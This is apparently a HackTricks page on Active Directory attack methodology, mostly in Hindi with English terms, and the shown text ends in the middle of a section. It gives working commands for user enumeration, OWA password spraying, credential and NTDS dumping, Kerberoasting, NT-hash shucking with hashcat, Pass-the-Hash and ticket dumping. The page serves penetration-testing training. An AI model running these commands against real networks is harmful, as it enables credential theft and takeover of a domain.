# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** एक बुनियादी तकनीक है जो **network administrators** को नेटवर्क के भीतर **domains**, **users**, और **objects** को प्रभावी रूप से बनाने और प्रबंधित करने में सक्षम बनाती है। यह स्केलेबल तरीके से डिजाइन किया गया है, जिससे बड़ी संख्या में उपयोगकर्ताओं को प्रबंधनीय **groups** और **subgroups** में व्यवस्थित किया जा सकता है, और विभिन्न स्तरों पर **access rights** को नियंत्रित किया जा सकता है।

**Active Directory** की संरचना तीन प्रमुख परतों से बनी होती है: **domains**, **trees**, और **forests**। एक **domain** उन objects का संग्रह होता है, जैसे **users** या **devices**, जो एक साझा database साझा करते हैं। **Trees** उन domains के समूह होते हैं जो साझा संरचना द्वारा जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जो **trust relationships** के माध्यम से आपस में जुड़े होते हैं, और संगठनात्मक संरचना की उच्चतम परत का निर्माण करते हैं। प्रत्येक स्तर पर विशिष्ट **access** और **communication rights** निर्धारित किए जा सकते हैं।

Active Directory के भीतर मुख्य अवधारणाएँ शामिल हैं:

1. **Directory** – Active Directory objects से संबंधित सभी जानकारी को संग्रहीत करता है।
2. **Object** – डायरेक्टरी के भीतर मौजूद इकाइयाँ, जिनमें **users**, **groups**, या **shared folders** शामिल होते हैं।
3. **Domain** – डायरेक्टरी objects के लिए एक container के रूप में कार्य करता है; एक **forest** के भीतर कई domains सह-अस्तित्व में हो सकते हैं, प्रत्येक का अपना object संग्रह होता है।
4. **Tree** – domains का एक समूह जो एक सामान्य root domain साझा करते हैं।
5. **Forest** – Active Directory में संगठनात्मक संरचना की चोटी, जो कई trees से बनी होती है और उनके बीच **trust relationships** होते हैं।

**Active Directory Domain Services (AD DS)** में नेटवर्क के केंद्रीकृत प्रबंधन और संचार के लिए महत्वपूर्ण सेवाएँ शामिल हैं। ये सेवाएँ निम्नलिखित हैं:

1. **Domain Services** – डेटा भंडारण को केंद्रीकृत करता है और **users** और **domains** के बीच इंटरैक्शनों का प्रबंधन करता है, जिसमें **authentication** और **search** कार्यक्षमताएँ शामिल हैं।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण और प्रबंधन का प्रबंधन करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से डायरेक्टरी-सक्षम अनुप्रयोगों का समर्थन करता है।
4. **Directory Federation Services** – कई वेब अनुप्रयोगों में एक ही session में उपयोगकर्ताओं को authenticate करने के लिए **single-sign-on** क्षमताएँ प्रदान करता है।
5. **Rights Management** – कॉपीराइट सामग्री की अनाधिकृत वितरण और उपयोग को नियंत्रित करके उसकी सुरक्षा में मदद करता है।
6. **DNS Service** – **domain names** के समाधान के लिए आवश्यक है।

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD वातावरण तक पहुँच है लेकिन आपके पास कोई credentials/sessions नहीं हैं, तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क स्कैन करें, मशीनें और खुले पोर्ट ढूँढें और कोशिश करें कि उनमें मौजूद vulnerabilities को **exploit** करें या उनसे **extract credentials** करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md) ).
- DNS का enumeration domain में प्रमुख सर्वरों के बारे में जानकारी दे सकता है जैसे web, printers, shares, vpn, media, इत्यादि।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- इस बारे में अधिक जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह आधुनिक Windows संस्करणों पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर को enumerate करने के लिए एक विस्तृत गाइड यहाँ मिल सकती है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP को enumerate करने के लिए एक विस्तृत गाइड यहाँ मिल सकती है (anonymous access पर विशेष ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- credentials इकट्ठा करना [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- host तक पहुँच [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- credentials इकट्ठा करना **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- internal documents, social media, सेवाओं (मुख्यतः web) के भीतर और सार्वजनिक रूप से उपलब्ध स्रोतों से usernames/names निकालें।
- यदि आपको कंपनी के कर्मचारियों के पूरे नाम मिलते हैं, तो आप अलग-अलग AD **username conventions** आज़मा सकते हैं ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). सबसे सामान्य conventions हैं: _NameSurname_, _Name.Surname_, _NamSur_ (3letters of each), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123)।
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Check the [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) and [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) pages.
- **Kerbrute enum**: जब एक **invalid username is requested** सर्वर **Kerberos error** कोड _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ प्रतिक्रिया करेगा, जिससे हमें पता चल जाएगा कि username अमान्य था। **Valid usernames** या तो **TGT in a AS-REP** response देंगे या error _KRB5KDC_ERR_PREAUTH_REQUIRED_, जो संकेत देता है कि user को pre-authentication करना आवश्यक है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफ़ेस के खिलाफ auth-level = 1 (No authentication) का उपयोग। यह मेथड MS-NRPC इंटरफ़ेस को bind करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करता है ताकि बिना किसी credentials के जांच सकें कि user या computer मौजूद है या नहीं। यह प्रकार की enumeration को लागू करने वाला टूल [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) है। इस रिसर्च को यहाँ पाया जा सकता है [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आप नेटवर्क में इनमें से किसी सर्वर को पाएँ तो आप **user enumeration against it** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **कंपनी में काम करने वाले लोगों के नाम** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### एक या कई यूज़रनेम जानना

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): यदि किसी user के पास _DONT_REQ_PREAUTH_ attribute **न हो** तो आप उस user के लिए **AS_REP message** request कर सकते हैं; यह कुछ डेटा रखेगा जो user के पासवर्ड के व्युत्पन्न से encrypted होगा।
- [**Password Spraying**](password-spraying.md): खोजे गए प्रत्येक user के साथ सबसे **आम पासवर्ड** आज़माएँ, शायद कोई user खराब पासवर्ड इस्तेमाल कर रहा हो (पासवर्ड पॉलिसी का ध्यान रखें!)।
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** का उपयोग प्रत्येक engagement के लिए AD recon state रखने के लिए करें: `workspace create <name>` प्रति-प्रोटोकॉल SQLite DBs को `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc) के अंतर्गत बनाता है। `proto smb|mssql|winrm` से views स्विच करें और एकत्रित secrets को `creds` से सूचीबद्ध करें। समाप्त होने पर संवेदनशील डेटा मैन्युअली हटाएँ: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** से **domain**, **OS build**, **SMB signing requirements**, और **Null Auth** की जानकारी सामने आती है। जिन होस्ट्स में `(signing:False)` दिखे वे **relay-prone** होते हैं, जबकि DCs अक्सर signing की मांग करते हैं।
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- जब **SMB relay to the DC is blocked** by signing, तब भी **LDAP** की posture जांचें: `netexec ldap <dc>` `(signing:None)` / weak channel binding को उजागर करता है। SMB signing required लेकिन LDAP signing disabled होने वाला DC ऐसे दुरुपयोगों के लिए एक व्यवहार्य **relay-to-LDAP** लक्ष्य बना रहता है जैसे **SPN-less RBCD**।

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs कभी-कभी **embed masked admin passwords in HTML**। Source/devtools देखें तो cleartext सामने आ सकता है (उदाहरण: `<input value="<password>">`), जिससे Basic-auth के जरिए scan/print repositories तक पहुँच मिल सकती है।
- Retrieved print jobs में कभी-कभी **plaintext onboarding docs** होते हैं जिनमें per-user passwords होते हैं। टेस्ट करते समय pairings को aligned रखें:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

यदि आप **null या guest user** के साथ दूसरे PCs या shares तक पहुँच सकते हैं तो आप **फाइलें रख सकते हैं** (जैसे एक SCF file) जो यदि किसी तरह एक्सेस की जाती हैं तो ये **आपके खिलाफ NTLM authentication trigger करेंगी** ताकि आप **NTLM challenge** चोरी करके उसे क्रैक कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** प्रत्येक NT hash जिसे आपके पास पहले से है, उसे अन्य, धीमे फॉर्मैट्स के लिए एक candidate password के रूप में मानता है जिनके key material सीधे NT hash से निकाले जाते हैं। लंबी पासफ़्रेज़ेस को Kerberos RC4 tickets, NetNTLM challenges, या cached credentials में brute-force करने के बजाय, आप NT hashes को Hashcat की NT-candidate modes में डालते हैं और यह password reuse को वैलिडेट कर देता है बिना कभी plaintext जानने के। यह खासकर डोमेन compromise के बाद बहुत प्रभावी होता है जब आप हजारों मौजूदा और ऐतिहासिक NT hashes इकट्ठा कर सकते हैं।

Use shucking when:

- आपके पास DCSync, SAM/SECURITY dumps, या credential vaults से NT corpus है और आपको अन्य domains/forests में reuse की जांच करनी है।
- आप RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, या DCC/DCC2 blobs capture करते हैं।
- आप लंबे, uncrackable पासफ़्रेज़ के reuse को जल्दी से साबित करना चाहते हैं और तुरंत Pass-the-Hash के जरिए pivot करना चाहते हैं।

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). डुप्लिकेट हटाकर उन hashes को उसी `nt_candidates.txt` सूची में जोड़ें।
- **Track metadata** – हर hash को उत्पन्न करने वाले username/domain को रखें (भले ही wordlist में केवल hex ही हो). Matching hashes आपको तुरंत बता देते हैं कि कौन सा principal password reuse कर रहा है जब Hashcat विनिंग candidate प्रिंट करे।
- इसी forest या trusted forest के candidates को प्राथमिकता दें; इससे shucking करते समय overlap की संभावना अधिक होती है।

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

नोट्स:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Rule engines डिसेबल करें (कोई `-r`, कोई hybrid modes नहीं) क्योंकि mangling candidate key material को करप्ट कर देता है।
- ये modes स्वाभाविक रूप से तेज़ नहीं हैं, पर NTLM keyspace (~30,000 MH/s on an M3 Max) Kerberos RC4 (~300 MH/s) की तुलना में ~100× तेज है। curated NT list का परीक्षण धीमे फॉर्मैट में पूरे password space को एक्सप्लोर करने से काफी सस्ता है।
- हमेशा **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) चलाएँ क्योंकि modes 31500/31600/35300/35400 हाल ही में भेजे गए थे।
- वर्तमान में AS-REQ Pre-Auth के लिए कोई NT mode नहीं है, और AES etypes (19600/19700) के लिए plaintext password चाहिए क्योंकि उनकी keys PBKDF2 के माध्यम से UTF-16LE passwords से निकाली जाती हैं, न कि raw NT hashes से।

#### Example – Kerberoast RC4 (mode 35300)

1. एक low-privileged user के साथ target SPN के लिए RC4 TGS capture करें (विस्तार के लिए Kerberoast पेज देखें):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. अपनी NT list के साथ ticket shuck करें:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat प्रत्येक NT candidate से RC4 key derive करता है और `$krb5tgs$23$...` blob को validate करता है। मिलान यह पुष्टि करता है कि service account आपका कोई मौज़ूद NT hash उपयोग कर रहा है।

3. तुरंत PtH के जरिए pivot करें:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

अगर ज़रूरत हो तो आप बाद में plaintext को `hashcat -m 1000 <matched_hash> wordlists/` के साथ पुनर्प्राप्त कर सकते हैं।

#### Example – Cached credentials (mode 31600)

1. किसी compromised workstation से cached logons dump करें:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. दिलचस्प domain user के लिए DCC2 लाइन को `dcc2_highpriv.txt` में कॉपी करें और इसे shuck करें:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. सफल मैच वह NT hash देता है जो आपकी सूची में पहले से मौजूद है, यह साबित करता है कि cached user password reuse कर रहा है। इसे सीधे PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) के लिए उपयोग करें या fast NTLM mode में brute-force करके string recover करें।

सही वही workflow NetNTLM challenge-responses (`-m 27000/27100`) और DCC (`-m 31500`) पर भी लागू होता है। एक बार match पहचान ली गई तो आप relay, SMB/WMI/WinRM PtH लॉन्च कर सकते हैं, या offline masks/rules के साथ NT hash को फिर से क्रैक कर सकते हैं।

## Enumerating Active Directory WITH credentials/session

इस चरण के लिए आपके पास एक वैध domain account के credentials या session compromise होना चाहिए। यदि आपके पास कुछ वैध credentials या domain user का shell है, तो आपको याद रखना चाहिए कि पहले दिए गए विकल्प अन्य उपयोगकर्ताओं को compromise करने के लिए अभी भी विकल्प बने हुए हैं।

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना पूरे domain को compromise शुरू करने का एक बड़ा कदम है, क्योंकि आप **Active Directory Enumeration:** शुरू करने में सक्षम होंगे।

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- आप [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**powershell for recon**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं जो अधिक stealthier होगा
- आप [**use powerview**](../basic-powershell-for-pentesters/powerview.md) का भी उपयोग कर सकते हैं ताकि और विस्तृत जानकारी निकाली जा सके
- Active Directory में recon के लिए एक और शानदार tool है [**BloodHound**](bloodhound.md)। यह **बहुत stealthy नहीं है** (आपके collection methods पर निर्भर करता है), पर **यदि आपको इसकी परवाह नहीं है** तो आपको इसे जरूर आज़माना चाहिए। पता लगाएँ कि users कहाँ RDP कर सकते हैं, अन्य groups तक पहुँच के path खोजें, आदि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) क्योंकि वे रोचक जानकारी हो सकते हैं।
- एक **GUI वाला tool** जिसका आप directory enumerate करने के लिए उपयोग कर सकते हैं वह है **AdExplorer.exe** जो **SysInternal** Suite का है।
- आप LDAP database में **ldapsearch** के साथ खोज भी कर सकते हैं ताकि _userPassword_ & _unixUserPassword_ फ़ील्ड्स या _Description_ में credentials ढूँढ सकें। अन्य तरीकों के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) देखें।
- यदि आप **Linux** उपयोग कर रहे हैं, तो आप domain enumerate करने के लिए [**pywerview**](https://github.com/the-useless-one/pywerview) का भी उपयोग कर सकते हैं।
- आप automated tools भी आज़मा सकते हैं जैसे:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows से सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`). Linux में, आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration सेक्शन छोटा लगे, यह सबसे महत्वपूर्ण भाग है। लिंक (मुख्यतः cmd, powershell, powerview और BloodHound वाले) एक्सेस करें, सीखें कि domain का enumeration कैसे किया जाता है और तब तक अभ्यास करें जब तक आप सहज न हों। एक assessment के दौरान, यह DA तक पहुँचने का मुख्य क्षण होगा या यह तय करने का कि कुछ नहीं किया जा सकता।

### Kerberoast

Kerberoasting में user accounts से जुड़े services द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनकी encryption को क्रैक करना शामिल है—जिसका आधार user passwords होते हैं—**offline**।

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आपके पास कुछ credentials हो जाएँ तो आप चेक कर सकते हैं कि क्या आपकी पहुँच किसी भी **machine** तक है। इसके लिए आप **CrackMapExec** का उपयोग कर सकते हैं ताकि अपने port scans के अनुसार अलग-अलग protocols के साथ कई servers से कनेक्ट करने का प्रयास कर सकें।

### Local Privilege Escalation

यदि आपने एक सामान्य domain user के रूप में credentials या session compromise कर लिया है और इस user के साथ आपके पास domain की किसी भी machine तक पहुँच है, तो आपको स्थानीय रूप से privileges escalate करने और credentials loot करने का रास्ता ढूँढना चाहिए। क्योंकि केवल local administrator privileges के साथ आप दूसरों के users के hashes memory (LSASS) और स्थानीय रूप से (SAM) dump कर पाएँगे।

इस किताब में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) के बारे में पूरा पृष्ठ है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह बहुत **असंभव** है कि आप current user में ऐसे **tickets** पाएँ जो आपको अप्रत्याशित resources तक पहुँच की अनुमति दें, पर आप निम्न जांच कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आप Active Directory को enumerate करने में सफल रहे हैं तो आपके पास **अधिक ईमेल और नेटवर्क की बेहतर समझ** होगी। आप संभवतः NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Computer Shares में Creds की तलाश | SMB Shares

अब जब आपके पास कुछ basic credentials हैं तो आपको यह जांचना चाहिए कि क्या आप **AD के अंदर किसी भी दिलचस्प फाइल को ढूँढ** सकते हैं जो share की जा रही हों। आप यह मैन्युअली कर सकते हैं लेकिन यह एक बहुत ही उबाऊ और दोहरावदार काम है (और भी ज्यादा अगर आपको सैकड़ों docs मिलें जिन्हें जांचना पड़े)।

[**इन टूल्स के बारे में जानने के लिए इस लिंक का अनुसरण करें।**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप **access other PCs or shares** कर सकते हैं आप **place files** (like a SCF file) रख सकते हैं जो किसी तरह access होने पर **trigger an NTLM authentication against you** करेंगी ताकि आप **steal** कर सकें **the NTLM challenge** और उसे crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

आशा है कि आप [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके किसी **local admin** खाते को **compromise** करने में सफल रहे होंगे।\
अब समय है कि आप memory और local सिस्टम से सभी hashes को dump करें।\
[**hashes प्राप्त करने के विभिन्न तरीकों के बारे में इस पेज को पढ़ें।**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, आप इसका उपयोग करके उसे **impersonate** कर सकते हैं।\
आपको किसी ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करते हुए **NTLM authentication** को **perform** करे, **or** आप नया **sessionlogon** बना कर उस **hash** को **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब किसी भी **NTLM authentication is performed** तो वह **hash will be used.** आखिरी विकल्प वही है जो mimikatz करता है।\
[**अधिक जानकारी के लिए इस पेज को पढ़ें।**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह हमला उद्देश्य रखता है कि **use the user NTLM hash to request Kerberos tickets**, जो common Pass The Hash over NTLM protocol का एक वैकल्पिक तरीका है। इसलिए यह विशेष रूप से **useful in networks where NTLM protocol is disabled** और केवल **Kerberos is allowed** authentication protocol के रूप में होने वाली नेटवर्क में उपयोगी हो सकता है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी **local administrator** का **hash** या **password** है तो आपको इसके साथ अन्य **PCs** पर स्थानीय रूप से **login locally** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **अत्यधिक शोर** है और **LAPS** इसे **कम करेगा**।

### MSSQL Abuse & Trusted Links

यदि किसी user के पास **MSSQL instances** को एक्सेस करने के privileges हैं, तो वह MSSQL host पर (यदि SA के रूप में चल रहा हो) **commands execute** कर सकता है, NetNTLM **hash** चोरी कर सकता है या यहां तक कि **relay attack** कर सकता है।\
इसके अलावा, यदि एक MSSQL instance किसी दूसरे MSSQL instance द्वारा trusted (database link) है और उपयोगकर्ता के पास trusted database पर privileges हैं, तो वह **trust relationship का उपयोग कर दूसरे instance में भी queries execute करने** में सक्षम होगा। ये trusts chained हो सकते हैं और किसी बिंदु पर user एक misconfigured database खोज सकता है जहां वह commands execute कर सके।\
**Databases के बीच के links forest trusts के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुंच के लिए शक्तिशाली रास्ते उजागर करते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object को attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) के साथ पाते हैं और उस कंप्यूटर पर आपके पास domain privileges हैं, तो आप उस कंप्यूटर पर लॉगिन करने वाले हर user के memory से TGTs dump कर पाएंगे।\
तो, यदि कोई **Domain Admin उस कंप्यूटर पर login करता है**, तो आप उसका TGT dump कर [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसे impersonate कर सकेंगे।\
Constrained delegation की वजह से आप यहाँ तक कि **एक Print Server को स्वचालित रूप से compromise** कर सकते हैं (आशा है कि वह DC होगा)。


{{#ref}}
